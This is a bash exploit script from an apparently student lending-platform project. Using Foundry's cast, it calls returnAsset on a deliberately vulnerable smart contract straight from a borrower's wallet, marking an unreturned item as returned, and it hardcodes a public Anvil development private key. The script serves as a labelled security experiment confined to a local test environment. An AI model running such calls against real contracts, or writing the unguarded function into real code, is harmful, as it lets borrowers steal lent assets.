#!/usr/bin/env bash
# SECURITY EXPERIMENT ONLY: the borrower's attack, sent from their own wallet straight to the contract,
# bypassing the app. Closes the loan as "returned, not damaged" without the item ever being returned.
# Works only against the attack environment (CampusVaultVulnerable); the real contract rejects it.
#   ./scripts/attack-loan.sh <loanId>
set -euo pipefail
cd "$(dirname "$0")/.."

LOAN_ID="${1:?Usage: ./scripts/attack-loan.sh <loanId>}"
ENV_FILE=../Backend/cv-backend/attack-env.properties
[ -f "$ENV_FILE" ] || { echo "Run scripts/deploy-attack-env.js first."; exit 1; }
CONTRACT=$(grep '^app.blockchain.contract-address=' "$ENV_FILE" | cut -d= -f2)

# The borrower's personal wallet: Anvil's public development account #1 (never a real key).
BORROWER_KEY=0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
OPERATOR=$(cast call "$CONTRACT" "operator()(address)")

echo "Contract:          $CONTRACT"
echo "Contract operator: $OPERATOR"
echo "Attacker wallet:   $(cast wallet address --private-key $BORROWER_KEY)"
echo "Loan $LOAN_ID before: $(cast call "$CONTRACT" "loans(uint256)(uint256,uint256,uint256,uint256,bool,bool)" "$LOAN_ID" | sed -n 5p | sed 's/^/open=/')"
echo
echo "Calling returnAsset($LOAN_ID, false) from the attacker wallet..."
cast send "$CONTRACT" "returnAsset(uint256,bool)" "$LOAN_ID" false --private-key "$BORROWER_KEY" \
  | grep -E '^(status|transactionHash|blockNumber|gasUsed|from|to) '
echo
echo "Loan $LOAN_ID after:  $(cast call "$CONTRACT" "loans(uint256)(uint256,uint256,uint256,uint256,bool,bool)" "$LOAN_ID" | sed -n 5p | sed 's/^/open=/')"
